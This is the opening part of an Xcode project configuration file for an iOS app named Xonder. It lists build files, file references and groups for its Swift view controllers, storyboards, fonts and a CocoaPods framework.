// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 51;
	objects = {

/* Begin PBXBuildFile section */
		17BEB897F109CACDA653F0DC /* Pods_Xonder.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C4EF80C05B016B2C2E39C37D /* Pods_Xonder.framework */; };
		3B008D75264A6AE500BE9E13 /* Dashboard.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 3B008D74264A6AE500BE9E13 /* Dashboard.storyboard */; };
		3B306E37265E24D4005B075C /* YourCustomersScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B306E36265E24D4005B075C /* YourCustomersScreenViewController.swift */; };
		3B5D33B72654C8E6002F0BA3 /* DashboardCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B5D33B62654C8E6002F0BA3 /* DashboardCollectionViewCell.swift */; };
		3B5D33BA26550E6D002F0BA3 /* DashboardSelectionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B5D33B926550E6D002F0BA3 /* DashboardSelectionViewController.swift */; };
		3B63B206264AC38600E9A994 /* MasterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B63B205264AC38600E9A994 /* MasterViewController.swift */; };
		3B63B20A264BCCD500E9A994 /* ShadowView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B63B209264BCCD500E9A994 /* ShadowView.swift */; };
		3B63B213264BCFD100E9A994 /* HouschkaPro-Thin.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 3B63B212264BCF7B00E9A994 /* HouschkaPro-Thin.ttf */; };
		3B63B214264BCFD100E9A994 /* HouschkaPro-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 3B63B211264BCF7200E9A994 /* HouschkaPro-Medium.ttf */; };
		3B63B215264BCFD100E9A994 /* HouschkaPro-ExtraBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 3B63B20F264BCF5D00E9A994 /* HouschkaPro-ExtraBold.ttf */; };
		3B63B216264BCFD100E9A994 /* HouschkaPro-Light.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 3B63B210264BCF6800E9A994 /* HouschkaPro-Light.ttf */; };
		3B63B217264BCFD100E9A994 /* HouschkaPro-DemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 3B63B20E264BCF4F00E9A994 /* HouschkaPro-DemiBold.ttf */; };
		3B63B218264BCFD100E9A994 /* HouschkaPro-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 3B63B20D264BCF4300E9A994 /* HouschkaPro-Bold.ttf */; };
		3B91AB24264BFF4000B0C0EF /* TransactionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B91AB23264BFF4000B0C0EF /* TransactionViewController.swift */; };
		3B91AB28264BFF7100B0C0EF /* DashboardViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B91AB27264BFF7100B0C0EF /* DashboardViewController.swift */; };
		3BA6378A2656CE9A00C504FF /* TransactionDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BA637892656CE9A00C504FF /* TransactionDetailViewController.swift */; };
		3BC2400D26554DE600C0DF03 /* Transaction.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 3BC2400C26554DE600C0DF03 /* Transaction.storyboard */; };
		3BC24010265550C700C0DF03 /* TabTransactionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BC2400F265550C700C0DF03 /* TabTransactionViewController.swift */; };
		3BFD804926528BB600ABE8E3 /* SearchTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BFD804826528BB600ABE8E3 /* SearchTableViewCell.swift */; };
		3BFD804B26528BC800ABE8E3 /* BalanceTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BFD804A26528BC800ABE8E3 /* BalanceTableViewCell.swift */; };
		3BFD804D26528BD600ABE8E3 /* MonthPickerTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BFD804C26528BD600ABE8E3 /* MonthPickerTableViewCell.swift */; };
		3BFD804F26528BE600ABE8E3 /* TransactionTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BFD804E26528BE600ABE8E3 /* TransactionTableViewCell.swift */; };
		704F32132648C13A0027397B /* Signup.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 704F32122648C13A0027397B /* Signup.storyboard */; };
		704F32162648C18D0027397B /* OtpScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704F32152648C18D0027397B /* OtpScreenViewController.swift */; };
		704F32262648C9030027397B /* GetStartedScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704F32252648C9030027397B /* GetStartedScreenViewController.swift */; };
		704F322C2648C9CA0027397B /* LoginScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704F322B2648C9CA0027397B /* LoginScreenViewController.swift */; };
		704F32362648D5B10027397B /* CountryListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704F32342648D5B10027397B /* CountryListViewController.swift */; };
		704F32372648D5B10027397B /* CountryListTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704F32352648D5B10027397B /* CountryListTableViewCell.swift */; };
		704FCAEE26451CD80025F546 /* Login.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 704FCAED26451CD80025F546 /* Login.storyboard */; };
		704FCAF42645223E0025F546 /* CardView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704FCAF32645223E0025F546 /* CardView.swift */; };
		704FCAF72645224E0025F546 /* UIButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704FCAF62645224E0025F546 /* UIButton.swift */; };
		704FCAFE264522820025F546 /* UIView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704FCAFD264522820025F546 /* UIView.swift */; };
		705C02BC265A951E005638DC /* CountryPickedViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 705C02BB265A951E005638DC /* CountryPickedViewController.swift */; };
		7060360326432A560062039F /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7060360226432A560062039F /* AppDelegate.swift */; };
		7060360726432A560062039F /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7060360626432A560062039F /* ViewController.swift */; };
		7060360A26432A560062039F /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 7060360826432A560062039F /* Main.storyboard */; };
		7060360C26432A5B0062039F /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 7060360B26432A5B0062039F /* Assets.xcassets */; };
		7060360F26432A5B0062039F /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 7060360D26432A5B0062039F /* LaunchScreen.storyboard */; };
		7062CABA265781DD00D4214F /* YourCustomerScreenTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7062CAB9265781DD00D4214F /* YourCustomerScreenTableViewCell.swift */; };
		707583022657E3AD0055DF8A /* CountrySelectViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583012657E3AD0055DF8A /* CountrySelectViewController.swift */; };
		707583052657E4280055DF8A /* SelectNumberOfPaymentsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583042657E4280055DF8A /* SelectNumberOfPaymentsViewController.swift */; };
		707583082657E4BF0055DF8A /* SelectPaymentPerMonthViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583072657E4BF0055DF8A /* SelectPaymentPerMonthViewController.swift */; };
		7075830B2657E4FA0055DF8A /* SelectMoneyViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7075830A2657E4FA0055DF8A /* SelectMoneyViewController.swift */; };
		7075830E2657E5180055DF8A /* SocialLinkScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7075830D2657E5180055DF8A /* SocialLinkScreenViewController.swift */; };
		707583112657E5E70055DF8A /* YourProductViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583102657E5E70055DF8A /* YourProductViewController.swift */; };
		707583142657E7DA0055DF8A /* SelectCategoryViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583132657E7DA0055DF8A /* SelectCategoryViewController.swift */; };
		707583172657E7F00055DF8A /* SelectSubcategoryViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583162657E7F00055DF8A /* SelectSubcategoryViewController.swift */; };
		7075831A2657E8640055DF8A /* DigitCodeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583192657E8640055DF8A /* DigitCodeViewController.swift */; };
		7075831D2657E8860055DF8A /* PrimaryReasonViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7075831C2657E8860055DF8A /* PrimaryReasonViewController.swift */; };
		707583202657E8A40055DF8A /* PasswordScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7075831F2657E8A40055DF8A /* PasswordScreenViewController.swift */; };
		707583232657E92A0055DF8A /* EmailAddressViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583222657E92A0055DF8A /* EmailAddressViewController.swift */; };
		707583262657E9430055DF8A /* MobileNumberViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583252657E9420055DF8A /* MobileNumberViewController.swift */; };
		707583292657E9590055DF8A /* CreatePasswordViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707583282657E9590055DF8A /* CreatePasswordViewController.swift */; };
		707868E4265B80E4008EF9B8 /* SelectHomeAddressViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707868E3265B80E4008EF9B8 /* SelectHomeAddressViewController.swift */; };
		707868E7265B8111008EF9B8 /* AddAddressManuallyViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707868E6265B8111008EF9B8 /* AddAddressManuallyViewController.swift */; };
		707868EA265B8215008EF9B8 /* ResidenceCountryPickerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707868E9265B8215008EF9B8 /* ResidenceCountryPickerViewController.swift */; };
		707868ED265B86F5008EF9B8 /* SignupAddMobileViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707868EC265B86F5008EF9B8 /* SignupAddMobileViewController.swift */; };
		707868F1265B8924008EF9B8 /* SignupBussinessSelectViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707868F0265B8924008EF9B8 /* SignupBussinessSelectViewController.swift */; };
		707D115A2657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 707D11592657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift */; };
		70CA4F2B2657CF5500DA4DDE /* SignupVerifyNumberViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 70CA4F2A2657CF5500DA4DDE /* SignupVerifyNumberViewController.swift */; };
		C83FB7252643388E00A87093 /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = C83FB7242643388E00A87093 /* Constants.swift */; };
		C83FB72826433B5500A87093 /* UserModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = C83FB72726433B5500A87093 /* UserModel.swift */; };
		C83FB72B26433BF300A87093 /* Provider.swift in Sources */ = {isa = PBXBuildFile; fileRef = C83FB72A26433BF300A87093 /* Provider.swift */; };
		C83FB72E26433C6D00A87093 /* Plugins.swift in Sources */ = {isa = PBXBuildFile; fileRef = C83FB72D26433C6D00A87093 /* Plugins.swift */; };
		C83FB73126433D0B00A87093 /* Extension+UserDefault.swift in Sources */ = {isa = PBXBuildFile; fileRef = C83FB73026433D0B00A87093 /* Extension+UserDefault.swift */; };
		C83FB73D26433EAD00A87093 /* APIResult.swift in Sources */ = {isa = PBXBuildFile; fileRef = C83FB73C26433EAD00A87093 /* APIResult.swift */; };
		C83FB74026433ED500A87093 /* APIService.swift in Sources */ = {isa = PBXBuildFile; fileRef = C83FB73F26433ED500A87093 /* APIService.swift */; };
		C8727083264340E0005EFDEA /* Extension+Result.swift in Sources */ = {isa = PBXBuildFile; fileRef = C8727082264340E0005EFDEA /* Extension+Result.swift */; };
		C8727086264340F7005EFDEA /* Extension+Error.swift in Sources */ = {isa = PBXBuildFile; fileRef = C8727085264340F7005EFDEA /* Extension+Error.swift */; };
		C8727089264341CC005EFDEA /* CountryModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = C8727088264341CC005EFDEA /* CountryModel.swift */; };
		C872708C2643433D005EFDEA /* Extension+UIViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = C872708B2643433D005EFDEA /* Extension+UIViewController.swift */; };
		C872708F264343E0005EFDEA /* Alert.swift in Sources */ = {isa = PBXBuildFile; fileRef = C872708E264343E0005EFDEA /* Alert.swift */; };
		C89B5B18264336F300263F14 /* Services.swift in Sources */ = {isa = PBXBuildFile; fileRef = C89B5B17264336F300263F14 /* Services.swift */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		3B008D74264A6AE500BE9E13 /* Dashboard.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Dashboard.storyboard; sourceTree = "<group>"; };
		3B306E36265E24D4005B075C /* YourCustomersScreenViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = YourCustomersScreenViewController.swift; sourceTree = "<group>"; };
		3B5D33B62654C8E6002F0BA3 /* DashboardCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashboardCollectionViewCell.swift; sourceTree = "<group>"; };
		3B5D33B926550E6D002F0BA3 /* DashboardSelectionViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashboardSelectionViewController.swift; sourceTree = "<group>"; };
		3B63B205264AC38600E9A994 /* MasterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MasterViewController.swift; sourceTree = "<group>"; };
		3B63B209264BCCD500E9A994 /* ShadowView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ShadowView.swift; sourceTree = "<group>"; };
		3B63B20D264BCF4300E9A994 /* HouschkaPro-Bold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "HouschkaPro-Bold.ttf"; sourceTree = "<group>"; };
		3B63B20E264BCF4F00E9A994 /* HouschkaPro-DemiBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "HouschkaPro-DemiBold.ttf"; sourceTree = "<group>"; };
		3B63B20F264BCF5D00E9A994 /* HouschkaPro-ExtraBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "HouschkaPro-ExtraBold.ttf"; sourceTree = "<group>"; };
		3B63B210264BCF6800E9A994 /* HouschkaPro-Light.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "HouschkaPro-Light.ttf"; sourceTree = "<group>"; };
		3B63B211264BCF7200E9A994 /* HouschkaPro-Medium.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "HouschkaPro-Medium.ttf"; sourceTree = "<group>"; };
		3B63B212264BCF7B00E9A994 /* HouschkaPro-Thin.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "HouschkaPro-Thin.ttf"; sourceTree = "<group>"; };
		3B91AB23264BFF4000B0C0EF /* TransactionViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TransactionViewController.swift; sourceTree = "<group>"; };
		3B91AB27264BFF7100B0C0EF /* DashboardViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashboardViewController.swift; sourceTree = "<group>"; };
		3BA637892656CE9A00C504FF /* TransactionDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TransactionDetailViewController.swift; sourceTree = "<group>"; };
		3BC2400C26554DE600C0DF03 /* Transaction.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Transaction.storyboard; sourceTree = "<group>"; };
		3BC2400F265550C700C0DF03 /* TabTransactionViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TabTransactionViewController.swift; sourceTree = "<group>"; };
		3BFD804826528BB600ABE8E3 /* SearchTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchTableViewCell.swift; sourceTree = "<group>"; };
		3BFD804A26528BC800ABE8E3 /* BalanceTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BalanceTableViewCell.swift; sourceTree = "<group>"; };
		3BFD804C26528BD600ABE8E3 /* MonthPickerTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MonthPickerTableViewCell.swift; sourceTree = "<group>"; };
		3BFD804E26528BE600ABE8E3 /* TransactionTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TransactionTableViewCell.swift; sourceTree = "<group>"; };
		5B66287BAB70301295639823 /* Pods-Xonder.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Xonder.debug.xcconfig"; path = "Target Support Files/Pods-Xonder/Pods-Xonder.debug.xcconfig"; sourceTree = "<group>"; };
		704F32122648C13A0027397B /* Signup.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Signup.storyboard; sourceTree = "<group>"; };
		704F32152648C18D0027397B /* OtpScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OtpScreenViewController.swift; sourceTree = "<group>"; };
		704F32252648C9030027397B /* GetStartedScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GetStartedScreenViewController.swift; sourceTree = "<group>"; };
		704F322B2648C9CA0027397B /* LoginScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginScreenViewController.swift; sourceTree = "<group>"; };
		704F32342648D5B10027397B /* CountryListViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CountryListViewController.swift; sourceTree = "<group>"; };
		704F32352648D5B10027397B /* CountryListTableViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CountryListTableViewCell.swift; sourceTree = "<group>"; };
		704FCAED26451CD80025F546 /* Login.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Login.storyboard; sourceTree = "<group>"; };
		704FCAF32645223E0025F546 /* CardView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CardView.swift; sourceTree = "<group>"; };
		704FCAF62645224E0025F546 /* UIButton.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIButton.swift; sourceTree = "<group>"; };
		704FCAFD264522820025F546 /* UIView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIView.swift; sourceTree = "<group>"; };
		705C02BB265A951E005638DC /* CountryPickedViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CountryPickedViewController.swift; sourceTree = "<group>"; };
		706035FF26432A560062039F /* Xonder.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Xonder.app; sourceTree = BUILT_PRODUCTS_DIR; };
		7060360226432A560062039F /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		7060360626432A560062039F /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
		7060360926432A560062039F /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		7060360B26432A5B0062039F /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		7060360E26432A5B0062039F /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		7060361026432A5B0062039F /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		7062CAB9265781DD00D4214F /* YourCustomerScreenTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = YourCustomerScreenTableViewCell.swift; sourceTree = "<group>"; };
		707583012657E3AD0055DF8A /* CountrySelectViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CountrySelectViewController.swift; sourceTree = "<group>"; };
		707583042657E4280055DF8A /* SelectNumberOfPaymentsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectNumberOfPaymentsViewController.swift; sourceTree = "<group>"; };
		707583072657E4BF0055DF8A /* SelectPaymentPerMonthViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectPaymentPerMonthViewController.swift; sourceTree = "<group>"; };
		7075830A2657E4FA0055DF8A /* SelectMoneyViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectMoneyViewController.swift; sourceTree = "<group>"; };
		7075830D2657E5180055DF8A /* SocialLinkScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SocialLinkScreenViewController.swift; sourceTree = "<group>"; };
		707583102657E5E70055DF8A /* YourProductViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = YourProductViewController.swift; sourceTree = "<group>"; };
		707583132657E7DA0055DF8A /* SelectCategoryViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectCategoryViewController.swift; sourceTree = "<group>"; };
		707583162657E7F00055DF8A /* SelectSubcategoryViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectSubcategoryViewController.swift; sourceTree = "<group>"; };
		707583192657E8640055DF8A /* DigitCodeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DigitCodeViewController.swift; sourceTree = "<group>"; };
		7075831C2657E8860055DF8A /* PrimaryReasonViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PrimaryReasonViewController.swift; sourceTree = "<group>"; };
		7075831F2657E8A40055DF8A /* PasswordScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PasswordScreenViewController.swift; sourceTree = "<group>"; };
		707583222657E92A0055DF8A /* EmailAddressViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EmailAddressViewController.swift; sourceTree = "<group>"; };
		707583252657E9420055DF8A /* MobileNumberViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MobileNumberViewController.swift; sourceTree = "<group>"; };
		707583282657E9590055DF8A /* CreatePasswordViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreatePasswordViewController.swift; sourceTree = "<group>"; };
		707868E3265B80E4008EF9B8 /* SelectHomeAddressViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectHomeAddressViewController.swift; sourceTree = "<group>"; };
		707868E6265B8111008EF9B8 /* AddAddressManuallyViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddAddressManuallyViewController.swift; sourceTree = "<group>"; };
		707868E9265B8215008EF9B8 /* ResidenceCountryPickerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ResidenceCountryPickerViewController.swift; sourceTree = "<group>"; };
		707868EC265B86F5008EF9B8 /* SignupAddMobileViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = SignupAddMobileViewController.swift; path = "Xonder/Controllers/SignUp Screen VC/SignupAddMobileViewController.swift"; sourceTree = SOURCE_ROOT; };
		707868F0265B8924008EF9B8 /* SignupBussinessSelectViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupBussinessSelectViewController.swift; sourceTree = "<group>"; };
		707D11592657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupGetStartedScreenViewController.swift; sourceTree = "<group>"; };
		70CA4F2A2657CF5500DA4DDE /* SignupVerifyNumberViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupVerifyNumberViewController.swift; sourceTree = "<group>"; };
		70FDF60E264E8BC100707EAB /* SignupBusinessSelectionViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SignupBusinessSelectionViewController.swift; sourceTree = "<group>"; };
		70FDF611264E8BCA00707EAB /* SignupOTPViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SignupOTPViewController.swift; sourceTree = "<group>"; };
		70FDF614264E8BDC00707EAB /* SignupMobileViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SignupMobileViewController.swift; sourceTree = "<group>"; };
		C4EF80C05B016B2C2E39C37D /* Pods_Xonder.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Xonder.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		C83FB7242643388E00A87093 /* Constants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Constants.swift; sourceTree = "<group>"; };
		C83FB72726433B5500A87093 /* UserModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserModel.swift; sourceTree = "<group>"; };
		C83FB72A26433BF300A87093 /* Provider.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Provider.swift; sourceTree = "<group>"; };
		C83FB72D26433C6D00A87093 /* Plugins.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Plugins.swift; sourceTree = "<group>"; };
		C83FB73026433D0B00A87093 /* Extension+UserDefault.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Extension+UserDefault.swift"; sourceTree = "<group>"; };
		C83FB73C26433EAD00A87093 /* APIResult.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = APIResult.swift; sourceTree = "<group>"; };
		C83FB73F26433ED500A87093 /* APIService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APIService.swift; sourceTree = "<group>"; };
		C8727082264340E0005EFDEA /* Extension+Result.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Extension+Result.swift"; sourceTree = "<group>"; };
		C8727085264340F7005EFDEA /* Extension+Error.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Extension+Error.swift"; sourceTree = "<group>"; };
		C8727088264341CC005EFDEA /* CountryModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CountryModel.swift; sourceTree = "<group>"; };
		C872708B2643433D005EFDEA /* Extension+UIViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Extension+UIViewController.swift"; sourceTree = "<group>"; };
		C872708E264343E0005EFDEA /* Alert.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Alert.swift; sourceTree = "<group>"; };
		C89B5B17264336F300263F14 /* Services.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Services.swift; sourceTree = "<group>"; };
		D796CC2B2819301277504794 /* Pods-Xonder.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Xonder.release.xcconfig"; path = "Target Support Files/Pods-Xonder/Pods-Xonder.release.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		706035FC26432A560062039F /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				17BEB897F109CACDA653F0DC /* Pods_Xonder.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		3326ADE8F6C5BE98F7943D3A /* Pods */ = {
			isa = PBXGroup;
			children = (
				5B66287BAB70301295639823 /* Pods-Xonder.debug.xcconfig */,
				D796CC2B2819301277504794 /* Pods-Xonder.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		3B008D73264A6ACD00BE9E13 /* Dashboard */ = {
			isa = PBXGroup;
			children = (
				3B008D74264A6AE500BE9E13 /* Dashboard.storyboard */,
			);
			path = Dashboard;
			sourceTree = "<group>";
		};
		3B5D33B52654C8C7002F0BA3 /* DashboardCell */ = {
			isa = PBXGroup;
			children = (
				3B5D33B62654C8E6002F0BA3 /* DashboardCollectionViewCell.swift */,
			);
			path = DashboardCell;
			sourceTree = "<group>";
		};
		3B63B204264AC37100E9A994 /* MasterViewController */ = {
			isa = PBXGroup;
			children = (
				3B63B205264AC38600E9A994 /* MasterViewController.swift */,
			);
			path = MasterViewController;
			sourceTree = "<group>";
		};
		3B63B20C264BCF2700E9A994 /* Fonts */ = {
			isa = PBXGroup;
			children = (
				3B63B212264BCF7B00E9A994 /* HouschkaPro-Thin.ttf */,
				3B63B211264BCF7200E9A994 /* HouschkaPro-Medium.ttf */,
				3B63B20F264BCF5D00E9A994 /* HouschkaPro-ExtraBold.ttf */,
				3B63B210264BCF6800E9A994 /* HouschkaPro-Light.ttf */,
				3B63B20E264BCF4F00E9A994 /* HouschkaPro-DemiBold.ttf */,
				3B63B20D264BCF4300E9A994 /* HouschkaPro-Bold.ttf */,
			);
